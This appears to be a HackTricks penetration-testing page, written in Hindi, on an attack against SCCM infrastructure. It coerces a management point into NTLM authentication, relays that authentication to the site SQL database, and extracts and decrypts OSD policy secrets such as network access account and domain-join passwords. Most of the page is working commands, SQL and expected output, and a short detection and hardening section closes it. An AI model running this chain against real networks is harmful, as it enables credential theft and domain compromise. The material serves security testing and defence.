# SCCM प्रबंधन बिंदु NTLM रिले से SQL – OSD नीति गुप्त निष्कर्षण

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
एक **System Center Configuration Manager (SCCM) प्रबंधन बिंदु (MP)** को SMB/RPC के माध्यम से प्रमाणित करने के लिए मजबूर करके और उस NTLM मशीन खाते को **साइट डेटाबेस (MSSQL)** में **रिले** करके आप `smsdbrole_MP` / `smsdbrole_MPUserSvc` अधिकार प्राप्त करते हैं। ये भूमिकाएँ आपको एक सेट स्टोर की गई प्रक्रियाओं को कॉल करने की अनुमति देती हैं जो **ऑपरेटिंग सिस्टम डिप्लॉयमेंट (OSD)** नीति ब्लॉब्स (नेटवर्क एक्सेस खाता क्रेडेंशियल, कार्य-क्रम चर, आदि) को उजागर करती हैं। ब्लॉब्स हेक्स-कोडित/एन्क्रिप्टेड होते हैं लेकिन **PXEthief** के साथ डिकोड और डिक्रिप्ट किए जा सकते हैं, जिससे स्पष्ट गुप्त जानकारी मिलती है।

उच्च-स्तरीय श्रृंखला:
1. MP और साइट DB खोजें ↦ बिना प्रमाणीकरण के HTTP एंडपॉइंट `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`।
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` प्रारंभ करें।
3. **PetitPotam**, PrinterBug, DFSCoerce, आदि का उपयोग करके MP को मजबूर करें।
4. SOCKS प्रॉक्सी के माध्यम से `mssqlclient.py -windows-auth` के रूप में रिले किए गए **<DOMAIN>\\<MP-host>$** खाते के साथ कनेक्ट करें।
5. निष्पादित करें:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (या `MP_GetPolicyBodyAfterAuthorization`)
6. `0xFFFE` BOM को स्ट्रिप करें, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`।

गुप्त जानकारी जैसे `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, आदि बिना PXE या क्लाइंट को छुए पुनर्प्राप्त की जाती हैं।

---

## 1. बिना प्रमाणीकरण वाले MP एंडपॉइंट्स की गणना करना
MP ISAPI एक्सटेंशन **GetAuth.dll** कई पैरामीटर उजागर करता है जिन्हें प्रमाणीकरण की आवश्यकता नहीं होती (जब तक कि साइट केवल PKI न हो):

| पैरामीटर | उद्देश्य |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | साइट साइनिंग सर्टिफिकेट का सार्वजनिक कुंजी + *x86* / *x64* **सभी अज्ञात कंप्यूटर** उपकरणों के GUIDs लौटाता है। |
| `MPLIST` | साइट में हर प्रबंधन बिंदु की सूची बनाता है। |
| `SITESIGNCERT` | प्राथमिक-साइट साइनिंग सर्टिफिकेट लौटाता है (LDAP के बिना साइट सर्वर की पहचान करें)। |

GUIDs प्राप्त करें जो बाद में DB क्वेरी के लिए **clientID** के रूप में कार्य करेंगे:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. MP मशीन खाते को MSSQL पर रिले करें
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
जब मजबूरी सक्रिय होती है, आपको कुछ ऐसा देखना चाहिए:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. OSD नीतियों की पहचान करें संग्रहीत प्रक्रियाओं के माध्यम से
SOCKS प्रॉक्सी के माध्यम से कनेक्ट करें (डिफ़ॉल्ट रूप से पोर्ट 1080):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DB पर स्विच करें (3-अंकीय साइट कोड का उपयोग करें, जैसे `CM_001`)।

### 3.1 अज्ञात-कंप्यूटर GUIDs खोजें (वैकल्पिक)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2 असाइन की गई नीतियों की सूची
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
प्रत्येक पंक्ति में `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion` शामिल हैं।

नीतियों पर ध्यान दें:
* **NAAConfig**  – नेटवर्क एक्सेस खाता क्रेडेंशियल्स
* **TS_Sequence** – कार्य अनुक्रम चर (OSDJoinAccount/Password)
* **CollectionSettings** – इसमें रन-एज़ खाते हो सकते हैं

### 3.3  पूर्ण बॉडी प्राप्त करें
यदि आपके पास पहले से `PolicyID` और `PolicyVersion` है, तो आप clientID आवश्यकता को छोड़ सकते हैं:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> महत्वपूर्ण: SSMS में "अधिकतम वर्ण पुनर्प्राप्त" बढ़ाएँ (>65535) अन्यथा ब्लॉब काट दिया जाएगा।

---

## 4. ब्लॉब को डिकोड और डिक्रिप्ट करें
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
पुनर्प्राप्त किए गए रहस्यों का उदाहरण:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. प्रासंगिक SQL भूमिकाएँ और प्रक्रियाएँ
रिले के दौरान लॉगिन को निम्नलिखित से मैप किया जाता है:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

इन भूमिकाओं में दर्जनों EXEC अनुमतियाँ होती हैं, इस हमले में उपयोग की जाने वाली प्रमुख अनुमतियाँ हैं:

| स्टोर की गई प्रक्रिया | उद्देश्य |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | एक `clientID` पर लागू नीतियों की सूची। |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | पूर्ण नीति शरीर लौटाएँ। |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` पथ द्वारा लौटाया गया। |

आप पूर्ण सूची की जांच कर सकते हैं:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. पहचान और हार्डनिंग
1. **MP लॉगिन की निगरानी करें** – कोई भी MP कंप्यूटर खाता यदि किसी IP से लॉगिन कर रहा है जो इसका होस्ट नहीं है ≈ रिले।
2. साइट डेटाबेस पर **प्रामाणिकता के लिए विस्तारित सुरक्षा (EPA)** सक्षम करें (`PREVENT-14`)।
3. अप्रयुक्त NTLM को निष्क्रिय करें, SMB साइनिंग को लागू करें, RPC को प्रतिबंधित करें (
`PetitPotam`/`PrinterBug` के खिलाफ उपयोग की गई समान रोकथाम)।
4. IPSec / आपसी-TLS के साथ MP ↔ DB संचार को हार्डन करें।

---

## अन्य देखें
* NTLM रिले के मूलभूत सिद्धांत:
{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL दुरुपयोग और पोस्ट-एक्सप्लॉइटेशन:
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## संदर्भ
- [मैं आपके प्रबंधक से बात करना चाहूंगा: प्रबंधन बिंदु रिले के साथ रहस्यों की चोरी](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
